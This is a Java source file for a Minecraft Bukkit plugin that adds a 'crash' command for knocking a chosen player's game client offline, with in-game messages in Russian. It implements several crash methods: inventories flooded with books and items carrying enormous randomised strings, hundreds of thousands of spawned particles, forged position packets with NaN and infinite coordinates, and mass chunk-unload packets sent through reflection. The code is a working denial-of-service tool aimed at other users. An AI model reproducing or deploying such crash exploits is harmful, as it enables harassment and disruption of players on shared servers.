package ai.solar.kirill.main.comand.impl;

import ai.solar.kirill.SolarAI;
import ai.solar.kirill.main.comand.SubCommand;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.Material;
import org.bukkit.Particle;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.BookMeta;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.scheduler.BukkitTask;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.*;

public class CrashCommand extends SubCommand {
    private final Random random = new Random();
    private final Map<UUID, ItemStack[]> savedInventories = new HashMap<>();
    private final Map<UUID, BukkitTask> activeTasks = new HashMap<>();

    public CrashCommand(SolarAI plugin) {
        super(plugin);
    }

    @Override
    public String getName() {
        return "crash";
    }

    @Override
    public String getDescription() {
        return plugin.getLocaleManager().getMessage("commands.crash.help-description");
    }

    @Override
    public String getUsage() {
        return plugin.getLocaleManager().getMessage("commands.crash.help-usage");
    }

    @Override
    public void execute(CommandSender sender, String[] args) {
        if (args.length < 1) {
            sender.sendMessage(plugin.getLocaleManager().getMessage("commands.crash.usage"));
            sender.sendMessage("§eДоступные режимы:");
            sender.sendMessage("§7- §fbooks §7- Книги с огромными данными");
            sender.sendMessage("§7- §fparticles §7- Миллионы частиц");
            sender.sendMessage("§7- §fposition §7- Невалидные координаты");
            sender.sendMessage("§7- §fsigns §7- Таблички с длинным текстом");
            sender.sendMessage("§7- §fchunks §7- Массовая загрузка чанков");
            sender.sendMessage("§7- §fitems §7- Предметы с огромными NBT");
            sender.sendMessage("§7- §fall §7- Все методы сразу");
            return;
        }

        Player target = Bukkit.getPlayer(args[0]);
        if (target == null) {
            sender.sendMessage(plugin.getLocaleManager().getMessage("commands.crash.player-not-found")
                    .replace("%player%", args[0]));
            return;
        }

        if (target.equals(sender)) {
            sender.sendMessage(plugin.getLocaleManager().getMessage("commands.crash.cannot-crash-self"));
            return;
        }

        String modeStr = args.length >= 2 ? args[1].toLowerCase() : "all";

        try {
            switch (modeStr) {
                case "books":
                    crashViaBooks(target);
                    break;
                case "particles":
                    crashViaParticles(target);
                    break;
                case "position":
                    crashViaPosition(target);
                    break;
                case "signs":
                    crashViaSigns(target);
                    break;
                case "chunks":
                    crashViaChunks(target);
                    break;
                case "items":
                    crashViaItems(target);
                    break;
                case "all":
                    crashAll(target);
                    break;
                default:
                    sender.sendMessage("§cНеизвестный режим: " + modeStr);
                    return;
            }

            sender.sendMessage("§a✓ Краш отправлен игроку §f" + target.getName() + " §7[" + modeStr + "]");
            plugin.getLogger().info(sender.getName() + " crashed " + target.getName() + " with " + modeStr);

        } catch (Exception e) {
            sender.sendMessage("§cОшибка: " + e.getMessage());
            plugin.getLogger().warning("Crash failed: " + e.getMessage());
            e.printStackTrace();
        }
    }
    private void crashViaBooks(Player player) {

        savedInventories.put(player.getUniqueId(), player.getInventory().getContents().clone());

        Bukkit.getScheduler().runTask(plugin, () -> {
            try {
                for (int wave = 0; wave < 10; wave++) {
                    final int currentWave = wave;

                    Bukkit.getScheduler().runTaskLater(plugin, () -> {
                        if (!player.isOnline()) return;

                        for (int slot = 0; slot < 36; slot++) {
                            ItemStack book = createCrashBook();
                            player.getInventory().setItem(slot, book);
                        }

                        player.getInventory().setItemInMainHand(createCrashBook());
                        player.getInventory().setItemInOffHand(createCrashBook());
                        player.updateInventory();

                    }, currentWave * 10L);
                }

                Bukkit.getScheduler().runTaskLater(plugin, () -> {
                    if (player.isOnline() && savedInventories.containsKey(player.getUniqueId())) {
                        player.getInventory().setContents(savedInventories.get(player.getUniqueId()));
                        savedInventories.remove(player.getUniqueId());
                        player.updateInventory();
                    }
                }, 100L);

            } catch (Exception e) {
                e.printStackTrace();
            }
        });
    }

    private ItemStack createCrashBook() {
        ItemStack book = new ItemStack(Material.WRITTEN_BOOK);
        BookMeta meta = (BookMeta) book.getItemMeta();

        if (meta != null) {
            meta.setTitle(generateHugeString(32));
            meta.setAuthor(generateHugeString(32));

            List<String> pages = new ArrayList<>();
            for (int i = 0; i < 100; i++) {

                StringBuilder page = new StringBuilder();
                for (int j = 0; j < 256; j++) {
                    page.append("§k").append(generateHugeString(10));
                    page.append("§l§n§o§m");
                    page.append("\n");
                }
                pages.add(page.toString());
            }
            meta.setPages(pages);

            List<String> lore = new ArrayList<>();
            for (int i = 0; i < 100; i++) {
                lore.add(generateHugeString(200));
            }
            meta.setLore(lore);

            book.setItemMeta(meta);
        }

        return book;
    }

    private void crashViaPosition(Player player) {
        Bukkit.getScheduler().runTaskAsynchronously(plugin, () -> {
            try {
                Object handle = player.getClass().getMethod("getHandle").invoke(player);
                Object connection = getPlayerConnection(handle);

                if (connection == null) {

                    crashViaPositionFallback(player);
                    return;
                }

                for (int i = 0; i < 1000; i++) {
                    try {
                        sendPositionPacket(connection, Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE);
                        sendPositionPacket(connection, Double.NaN, Double.NaN, Double.NaN);
                        sendPositionPacket(connection, Double.POSITIVE_INFINITY, Double.NEGATIVE_INFINITY, 0);
                        sendPositionPacket(connection, -Double.MAX_VALUE, -Double.MAX_VALUE, -Double.MAX_VALUE);

                        if (i % 100 == 0) Thread.sleep(10);
                    } catch (Exception ignored) {
                    }
                }
            } catch (Exception e) {
                crashViaPositionFallback(player);
            }
        });
    }

    private void crashViaPositionFallback(Player player) {
        Bukkit.getScheduler().runTask(plugin, () -> {
            Location loc = player.getLocation();
            for (int i = 0; i < 50; i++) {
                final int wave = i;
                Bukkit.getScheduler().runTaskLater(plugin, () -> {
                    if (!player.isOnline()) return;

                    try {
                        Location fakeLoc = loc.clone();
                        fakeLoc.setX(Integer.MAX_VALUE / 2);
                        fakeLoc.setY(255);
                        fakeLoc.setZ(Integer.MAX_VALUE / 2);
                        player.sendBlockChange(fakeLoc, Material.BEDROCK.createBlockData());
                    } catch (Exception ignored) {
                    }
                }, wave * 2L);
            }
        });
    }

    private void sendPositionPacket(Object connection, double x, double y, double z) {
        try {
            String version = getNMSVersion();
            Class<?> positionClass = Class.forName("net.minecraft.server." + version + ".PacketPlayOutPosition");

            Constructor<?> con = null;
            for (Constructor<?> c : positionClass.getConstructors()) {
                if (c.getParameterCount() >= 5) {
                    con = c;
                    break;
                }
            }

            if (con != null) {
                Object packet;
                if (con.getParameterCount() == 5) {
                    packet = con.newInstance(x, y, z, 0f, 0f);
                } else if (con.getParameterCount() == 6) {
                    packet = con.newInstance(x, y, z, 0f, 0f, Collections.emptySet());
                } else {
                    packet = con.newInstance(x, y, z, 0f, 0f, Collections.emptySet(), 0);
                }
                sendPacket(connection, packet);
            }
        } catch (Exception ignored) {
        }
    }

    private void crashViaSigns(Player player) {
        Bukkit.getScheduler().runTask(plugin, () -> {
            Location loc = player.getLocation();

            for (int wave = 0; wave < 30; wave++) {
                final int currentWave = wave;

                Bukkit.getScheduler().runTaskLater(plugin, () -> {
                    if (!player.isOnline()) return;

                    try {

                        for (int i = 0; i < 100; i++) {
                            Location signLoc = loc.clone().add(
                                    random.nextInt(100) - 50,
                                    random.nextInt(50),
                                    random.nextInt(100) - 50
                            );

                            player.sendBlockChange(signLoc, Material.OAK_SIGN.createBlockData());

                            sendSignUpdate(player, signLoc);
                        }
                    } catch (Exception ignored) {
                    }
                }, currentWave * 5L);
            }
        });
    }

    private void sendSignUpdate(Player player, Location loc) {
        try {
            Object handle = player.getClass().getMethod("getHandle").invoke(player);
            Object connection = getPlayerConnection(handle);

            if (connection == null) return;

            String version = getNMSVersion();

            Class<?> tileEntityClass = Class.forName("net.minecraft.server." + version + ".PacketPlayOutTileEntityData");

            String[] lines = new String[4];
            for (int i = 0; i < 4; i++) {
                lines[i] = generateHugeString(1000);
            }

        } catch (Exception ignored) {
        }
    }

    private void crashViaChunks(Player player) {
        Bukkit.getScheduler().runTaskAsynchronously(plugin, () -> {
            try {
                Object handle = player.getClass().getMethod("getHandle").invoke(player);
                Object connection = getPlayerConnection(handle);

                if (connection == null) {
                    crashViaChunksFallback(player);
                    return;
                }

                String version = getNMSVersion();

                for (int i = 0; i < 500; i++) {
                    try {
                        int chunkX = random.nextInt(100000) - 50000;
                        int chunkZ = random.nextInt(100000) - 50000;

                        sendUnloadChunkPacket(connection, version, chunkX, chunkZ);

                        if (i % 50 == 0) Thread.sleep(10);
                    } catch (Exception ignored) {
                    }
                }
            } catch (Exception e) {
                crashViaChunksFallback(player);
            }
        });
    }

    private void crashViaChunksFallback(Player player) {
        Bukkit.getScheduler().runTask(plugin, () -> {
            Location loc = player.getLocation();

            for (int wave = 0; wave < 20; wave++) {
                final int currentWave = wave;

                Bukkit.getScheduler().runTaskLater(plugin, () -> {
                    if (!player.isOnline()) return;

                    for (int x = -16; x < 16; x++) {
                        for (int z = -16; z < 16; z++) {
                            for (int y = 0; y < 256; y += 16) {
                                Location blockLoc = loc.clone().add(x, y - loc.getY(), z);
                                try {
                                    player.sendBlockChange(blockLoc, Material.values()[random.nextInt(Material.values().length)].createBlockData());
                                } catch (Exception ignored) {
                                }
                            }
                        }
                    }
                }, currentWave * 5L);
            }
        });
    }

    private void sendUnloadChunkPacket(Object connection, String version, int x, int z) {
        try {
            Class<?> unloadClass = Class.forName("net.minecraft.server." + version + ".PacketPlayOutUnloadChunk");
            Constructor<?> con = unloadClass.getConstructor(int.class, int.class);
            Object packet = con.newInstance(x, z);
            sendPacket(connection, packet);
        } catch (Exception ignored) {
        }
    }


    private void crashViaItems(Player player) {
        savedInventories.put(player.getUniqueId(), player.getInventory().getContents().clone());

        Bukkit.getScheduler().runTask(plugin, () -> {
            for (int wave = 0; wave < 10; wave++) {
                final int currentWave = wave;

                Bukkit.getScheduler().runTaskLater(plugin, () -> {
                    if (!player.isOnline()) return;

                    for (int slot = 0; slot < 36; slot++) {
                        ItemStack item = createCrashItem();
                        player.getInventory().setItem(slot, item);
                    }
                    player.updateInventory();

                }, currentWave * 10L);
            }

            Bukkit.getScheduler().runTaskLater(plugin, () -> {
                if (player.isOnline() && savedInventories.containsKey(player.getUniqueId())) {
                    player.getInventory().setContents(savedInventories.get(player.getUniqueId()));
                    savedInventories.remove(player.getUniqueId());
                    player.updateInventory();
                }
            }, 100L);
        });
    }

    private ItemStack createCrashItem() {
        Material[] materials = {
                Material.DIAMOND_SWORD, Material.DIAMOND_PICKAXE,
                Material.DIAMOND_CHESTPLATE, Material.DIAMOND_HELMET,
                Material.SHIELD, Material.CROSSBOW
        };

        ItemStack item = new ItemStack(materials[random.nextInt(materials.length)]);
        ItemMeta meta = item.getItemMeta();

        if (meta != null) {

            meta.setDisplayName("§k" + generateHugeString(256));

            List<String> lore = new ArrayList<>();
            for (int i = 0; i < 200; i++) {
                lore.add("§k§l§m§n§o" + generateHugeString(500));
            }
            meta.setLore(lore);

            item.setItemMeta(meta);
        }

        item.setAmount(127);

        return item;
    }

    private void crashViaParticles(Player player) {
        Location loc = player.getLocation();

        Particle[] particles = {
                Particle.EXPLOSION_HUGE, Particle.EXPLOSION_LARGE,
                Particle.FLAME, Particle.SOUL_FIRE_FLAME,
                Particle.SMOKE_LARGE, Particle.SMOKE_NORMAL,
                Particle.CLOUD, Particle.DRAGON_BREATH,
                Particle.END_ROD, Particle.FIREWORKS_SPARK
        };

        for (int wave = 0; wave < 100; wave++) {
            final int currentWave = wave;

            Bukkit.getScheduler().runTaskLater(plugin, () -> {
                if (!player.isOnline()) return;

                try {
                    for (Particle particle : particles) {

                        player.spawnParticle(particle, loc, 10000, 50, 50, 50, 1.0);
                    }
                } catch (Exception ignored) {
                }
            }, currentWave * 2L);
        }
    }

    private void crashAll(Player player) {
        crashViaBooks(player);
        crashViaParticles(player);
        crashViaPosition(player);
        crashViaSigns(player);
        crashViaChunks(player);
        crashViaItems(player);
    }

    private String generateHugeString(int length) {
        StringBuilder sb = new StringBuilder();
        String chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789§k§l§m§n§o§r";

        for (int i = 0; i < length; i++) {
            sb.append(chars.charAt(random.nextInt(chars.length())));
        }

        for (int i = 0; i < length / 10; i++) {
            sb.append((char) (0x4E00 + random.nextInt(0x9FFF - 0x4E00)));
            sb.append((char) (0x0600 + random.nextInt(0x06FF - 0x0600)));
            sb.append((char) (0x0400 + random.nextInt(0x04FF - 0x0400)));
        }

        return sb.toString();
    }

    private Object getPlayerConnection(Object handle) throws Exception {
        try {
            return handle.getClass().getField("playerConnection").get(handle);
        } catch (Exception ex) {
            try {
                return handle.getClass().getField("connection").get(handle);
            } catch (Exception ex2) {
                try {

                    return handle.getClass().getField("b").get(handle);
                } catch (Exception ex3) {
                    Field[] fields = handle.getClass().getDeclaredFields();
                    for (Field f : fields) {
                        f.setAccessible(true);
                        Object val = f.get(handle);
                        if (val != null) {
                            String className = val.getClass().getSimpleName().toLowerCase();
                            if (className.contains("connection") || className.contains("network")) {
                                return val;
                            }
                        }
                    }
                }
            }
        }
        return null;
    }

    private void sendPacket(Object connection, Object packet) {
        try {
            Method sendMethod = null;

            String[] methodNames = {"sendPacket", "send", "a"};

            for (String methodName : methodNames) {
                try {
                    for (Method m : connection.getClass().getMethods()) {
                        if (m.getName().equals(methodName) && m.getParameterCount() == 1) {
                            sendMethod = m;
                            break;
                        }
                    }
                    if (sendMethod != null) break;
                } catch (Exception ignored) {
                }
            }

            if (sendMethod != null) {
                sendMethod.invoke(connection, packet);
            }
        } catch (Exception ignored) {
        }
    }

    private String getNMSVersion() {
        String pkg = Bukkit.getServer().getClass().getPackage().getName();
        return pkg.substring(pkg.lastIndexOf('.') + 1);
    }

    @Override
    public List<String> onTabComplete(CommandSender sender, String[] args) {
        List<String> suggestions = new ArrayList<>();

        if (args.length == 1) {
            String input = args[0].toLowerCase();
            for (Player p : Bukkit.getOnlinePlayers()) {
                if (p.getName().toLowerCase().startsWith(input)) {
                    suggestions.add(p.getName());
                }
            }
        } else if (args.length == 2) {
            String input = args[1].toLowerCase();
            String[] modes = {"books", "particles", "position", "signs", "chunks", "items", "all"};
            for (String m : modes) {
                if (m.startsWith(input)) {
                    suggestions.add(m);
                }
            }
        }

        return suggestions;
    }
}